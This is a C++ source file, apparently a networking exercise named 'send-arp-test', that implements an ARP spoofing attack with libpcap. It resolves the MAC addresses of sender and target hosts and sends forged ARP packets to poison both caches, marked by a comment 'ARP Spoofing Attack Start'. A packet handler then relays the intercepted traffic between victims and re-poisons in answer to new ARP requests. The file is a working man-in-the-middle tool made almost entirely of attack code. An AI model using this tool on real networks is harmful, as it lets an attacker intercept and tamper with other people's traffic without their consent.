#include <cstdio>
#include <pcap.h>
#include <map>
#include <unordered_set>
#include <iostream>
#include "arp.h"
#include "ip.h"

std::map<Ip, Mac> arpTable;
std::map<Ip, Ip> ipFlowTable;
std::map<Mac, Mac> macFlowTable;

Mac& myMac = Mac::nullMac();
Ip myIp;
pcap_t* handle;

#pragma pack(push, 1)
struct EthIpPacket final {
    EthHdr eth_;
    IpHdr ip_;
};
#pragma pack(pop)

struct MyData{
    Mac senderMac;
    pcap_t* handle;
};

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip> <target ip>]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void packet_handler(u_char* param, const struct pcap_pkthdr* header, const u_char* pkt_data){
    struct EthHdr *eh = (struct EthHdr*)pkt_data;
    auto macPair = macFlowTable.find(eh->smac());
    if (macPair == macFlowTable.end()){
        printf("no\n");
        return;
    }
    Mac tMac = macPair->second;
    if (eh->type() == EthHdr::Arp){
        struct ArpHdr *ah = (struct ArpHdr*)(eh+1);
        if (ah->op_ == ArpHdr::Request){
            Ip sIp = ah->sip();
            Ip tIp = ah->tip();
            sendArpURequest(handle, myMac, eh->smac(), tIp, sIp);
            printf("ARP Send S:%s T:%s\n", static_cast<std::string>(sIp).c_str(), static_cast<std::string>(tIp).c_str());
        }
        return;
    }
    eh->smac_ = myMac;
    eh->dmac_ = tMac;
    pcap_sendpacket(handle, pkt_data, header->caplen);
    printf("Packet Relay\n");
    /*
    char ch;
    std::cout << "next?";
    std::cin >> ch;
    if (ch!='s'){
        return;
    }
    pcap_breakloop(handle);*/
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
		usage();
		return -1;
    }

	char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    myMac = Mac::getMyMac(dev);
    //std::string myMacString = static_cast<std::string>(myMac);
    //printf("%s\n", myMacString.c_str());
    std::string m = argv[2];
    size_t index = m.rfind(".");
    myIp = Ip(m.substr(0, index) + ".99");

    for (int i=1;i<(argc-1)/2+1;i++){
        Ip senderIp = Ip(argv[i*2]);
        Ip targetIp = Ip(argv[i*2+1]);
        printf("%d: senderIp is %s\n", i, static_cast<std::string>(senderIp).c_str());
        printf("%d: targetIp is %s\n", i, static_cast<std::string>(targetIp).c_str());

        ipFlowTable[senderIp] = targetIp;
        ipFlowTable[targetIp] = senderIp;
        for (auto ipft = ipFlowTable.begin(); ipft != ipFlowTable.end(); ++ipft) {
            std::cout << "Key: " << static_cast<std::string>(ipft->first) << ", Value: " << static_cast<std::string>(ipft->second) << std::endl;
        }

        Mac senderMac = findMac(handle, arpTable, senderIp, myMac, myIp);
        arpTable[senderIp] = senderMac;
        Mac targetMac = findMac(handle, arpTable, targetIp, myMac, myIp);
        arpTable[targetIp] = targetMac;
        for (auto at = arpTable.begin(); at != arpTable.end(); ++at) {
            std::cout << "Key: " << static_cast<std::string>(at->first) << ", Value: " << static_cast<std::string>(at->second) << std::endl;
        }

        macFlowTable[senderMac] = targetMac;
        macFlowTable[targetMac] = senderMac;
        for (auto mft = macFlowTable.begin(); mft != macFlowTable.end(); ++mft) {
            std::cout << "Key: " << static_cast<std::string>(mft->first) << ", Value: " << static_cast<std::string>(mft->second) << std::endl;
        }

        // ARP Spoofing Attack Start
        sendArpURequest(handle, myMac, senderMac, targetIp, senderIp);
        sendArpURequest(handle, myMac, targetMac, senderIp, targetIp);

        pcap_loop(handle, 0, packet_handler, NULL);
    }

	pcap_close(handle);
}
